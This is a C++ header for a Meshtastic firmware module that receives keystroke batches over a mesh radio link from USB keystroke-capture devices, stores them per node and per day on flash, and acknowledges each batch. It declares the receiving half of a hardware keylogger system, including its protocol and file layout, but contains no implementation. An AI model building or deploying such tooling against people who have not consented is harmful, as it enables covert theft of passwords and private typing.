/**
 * @file KeylogReceiverModule.h
 * @brief Keylog receiver module for Heltec V4 base station
 *
 * Receives keystroke batches from XIAO USB capture devices via PRIVATE_APP port,
 * stores them to flash filesystem, and sends ACK responses.
 *
 * Architecture:
 *  - Inherits from SinglePortModule for mesh message handling
 *  - Uses LittleFS for persistent storage on ESP32 flash
 *  - Stores data in /keylogs/<node_id_hex>/keylog_<date>.txt
 *  - Sends "ACK:0x<batch_id>" responses for reliable delivery
 *
 * Protocol:
 *  - Port: PRIVATE_APP (256)
 *  - Incoming: [batch_id:4][data:N]
 *  - Outgoing ACK: "ACK:0x<8 hex digits>"
 *
 * NASA Power of 10 Compliance:
 *  - Fixed buffer sizes with compile-time bounds
 *  - Assertions for all pointer operations
 *  - No dynamic memory allocation after init
 *  - All loops have fixed upper bounds
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "configuration.h"

#ifdef KEYLOG_RECEIVER_ENABLED

#include "SinglePortModule.h"

/**
 * @brief Buffer and path size constants
 */
#define KEYLOG_MAX_PATH_LEN         64      /**< Maximum file path length */
#define KEYLOG_MAX_PAYLOAD_SIZE     512     /**< Maximum incoming payload size */
#define KEYLOG_ACK_BUFFER_SIZE      20      /**< Size for "ACK:0x12345678\0" */
#define KEYLOG_BATCH_HEADER_SIZE    4       /**< batch_id is 4 bytes */
#define KEYLOG_NODE_HEX_LEN         9       /**< 8 hex chars + null */

/**
 * @brief Statistics tracking constants
 */
#define KEYLOG_STATS_LOG_INTERVAL_MS 60000  /**< Log stats every 60 seconds */

/**
 * @brief Keylog Receiver Module for Heltec V4
 *
 * Receives keystroke batches from XIAO devices and stores to flash.
 * Implements reliable delivery via ACK responses.
 *
 * Storage Structure:
 *   /keylogs/
 *     <node_id_hex>/           e.g., /keylogs/a1b2c3d4/
 *       keylog_2025-12-13.txt  Day-based log files (append mode)
 *
 * Message Protocol:
 *  - Port: PRIVATE_APP (256)
 *  - Incoming payload: [batch_id:4][keystroke_data:N]
 *  - ACK response: "ACK:0x<batch_id_hex>"
 */
class KeylogReceiverModule : public SinglePortModule
{
  public:
    /**
     * @brief Constructor
     * Initializes SinglePortModule with PRIVATE_APP port
     */
    KeylogReceiverModule();

    /**
     * @brief Initialize the module
     * Creates /keylogs directory if it doesn't exist
     * @return true if initialization successful
     */
    bool init();

  protected:
    // ==================== MeshModule Interface ====================

    /**
     * @brief Handle received mesh packets
     * Processes incoming keystroke batches, stores to flash, sends ACK
     *
     * @param mp Received mesh packet
     * @return ProcessMessage::STOP if handled, CONTINUE otherwise
     */
    virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;

  private:
    // ==================== Storage Operations ====================

    /**
     * @brief Store keystroke batch to flash filesystem
     *
     * @param from Source node ID
     * @param batchId Batch ID for ACK correlation
     * @param data Keystroke data (after batch_id header)
     * @param len Length of keystroke data
     * @return true if stored successfully
     */
    bool storeKeystrokeBatch(NodeNum from, uint32_t batchId,
                             const uint8_t *data, size_t len);

    /**
     * @brief Ensure node directory exists
     *
     * @param nodeId Node ID to create directory for
     * @return true if directory exists or was created
     */
    bool ensureNodeDirectory(NodeNum nodeId);

    /**
     * @brief Get log file path for a node
     *
     * @param nodeId Node ID
     * @param pathBuf Output buffer for path (must be KEYLOG_MAX_PATH_LEN)
     * @return true if path was generated successfully
     */
    bool getLogFilePath(NodeNum nodeId, char *pathBuf);

    // ==================== ACK Operations ====================

    /**
     * @brief Send ACK response to sender
     *
     * @param to Destination node ID
     * @param batchId Batch ID to acknowledge
     * @return true if ACK was queued successfully
     */
    bool sendAck(NodeNum to, uint32_t batchId);

    // ==================== Statistics ====================

    uint32_t totalBatchesReceived;  /**< Total batches received */
    uint32_t totalBatchesStored;    /**< Batches successfully stored */
    uint32_t totalAcksSent;         /**< ACKs successfully sent */
    uint32_t storageErrors;         /**< Storage operation failures */
    uint32_t lastStatsLog;          /**< Last stats log timestamp */
};

extern KeylogReceiverModule *keylogReceiverModule;

#endif /* KEYLOG_RECEIVER_ENABLED */
